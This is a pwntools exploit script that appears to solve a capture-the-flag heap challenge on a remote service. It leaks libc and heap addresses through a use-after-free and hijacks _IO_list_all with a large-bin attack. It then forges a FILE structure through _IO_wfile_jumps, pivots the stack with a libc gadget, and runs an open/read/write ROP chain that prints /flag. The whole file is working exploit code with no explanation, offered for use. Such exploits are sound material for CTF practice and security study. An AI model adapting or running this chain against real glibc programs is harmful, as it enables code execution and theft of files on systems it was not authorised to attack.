from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'

def add(idx, type):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b'> ', str(idx));
	if type == 1:
		size = 0x880
	elif type == 2:
		size = 0x890
	else:
		size = 0x1100
	p.sendlineafter(b'>', str(size));

def delete(idx):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'> ', str(idx));

def edit(idx, content):
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b'> ', str(idx));
	p.sendafter(b'>', content);

def show(idx):
	p.sendlineafter(b'> ', b'4')
	p.sendlineafter(b'> ', str(idx));

def exit():
	p.sendlineafter(b'> ', b'5')

p = remote('10.99.210.100', 4240)
#p = process('./chal')
elf = ELF('./chal')
libc = ELF('./libc.so.6')


add(0, 2)
add(1, 1)
add(2, 1)
add(3, 1)
delete(0)
delete(2)
show(0)

libc.address = u64(p.recv(8)) - 0x21ace0
print(hex(libc.address))
heap = u64(p.recv(8)) - 0x13c0
print(hex(heap))

#gdb.attach(p)

pop_rdi_ret = next(libc.search(asm('pop rdi\nret')))
pop_rsi_ret = next(libc.search(asm('pop rsi\nret')))
pop_rdx_rbx_ret = next(libc.search(asm('pop rdx\npop rbx\nret')))
leave_ret = next(libc.search(asm('leave\nret')))
open = libc.symbols['open']
read = libc.symbols['read']
write = libc.symbols['write']
puts = libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))
_IO_list_all = libc.symbols['_IO_list_all']
_IO_wfile_jumps = libc.symbols['_IO_wfile_jumps']
_IO_2_1_stderr = libc.symbols['_IO_2_1_stderr_']
magic = libc.address + 0x16a06a

'''
0x000000000016a06a <+26>:	mov    rbp,QWORD PTR [rdi+0x48]
0x000000000016a06e <+30>:	mov    rax,QWORD PTR [rbp+0x18]
0x000000000016a072 <+34>:	lea    r13,[rbp+0x10]
0x000000000016a076 <+38>:	mov    DWORD PTR [rbp+0x10],0x0
0x000000000016a07d <+45>:	mov    rdi,r13
0x000000000016a080 <+48>:	call   QWORD PTR [rax+0x28]
'''


_lock = libc.address + 0x21ca60
chunk0 = heap + 0x290
chunk2 = heap + 0x13c0
orw_addr = chunk0 + 0xe0 + 0xe8 + 0x70



orw = b'/flag\x00\x00\x00'
orw += flat([pop_rdx_rbx_ret, 0, chunk0 - 0x10,
			 pop_rdi_ret, orw_addr,
			 pop_rsi_ret, 0,
			 open])

orw += flat([pop_rdi_ret, 3,
			 pop_rsi_ret, orw_addr + 0x100,
			 pop_rdx_rbx_ret, 0x100, 0,
			 read])
orw += flat([pop_rdi_ret, 1,
			 pop_rsi_ret, orw_addr + 0x100,
			 pop_rdx_rbx_ret, 0x100, 0,
			 write])

payload = p64(0) + p64(leave_ret) + p64(0) + p64(_IO_list_all - 0x20)
payload += p64(0) * 0x3
payload += p64(orw_addr)
payload += p64(0) * 0x7
payload += p64(_lock)
payload += p64(0) * 0x2
payload += p64(chunk0 + 0xe0)
payload += p64(0) * 0x6
payload += p64(_IO_wfile_jumps)
payload += p64(0) * 0x1c
payload += p64(chunk0 + 0xe0 + 0xe8)
payload += p64(0) * 0xd
payload += p64(magic)
payload += orw

add(4, 1)

delete(2)
edit(0, payload.ljust(0x880, b'\x00'))

add(4, 3)
add(5, 1)

exit()
p.interactive()
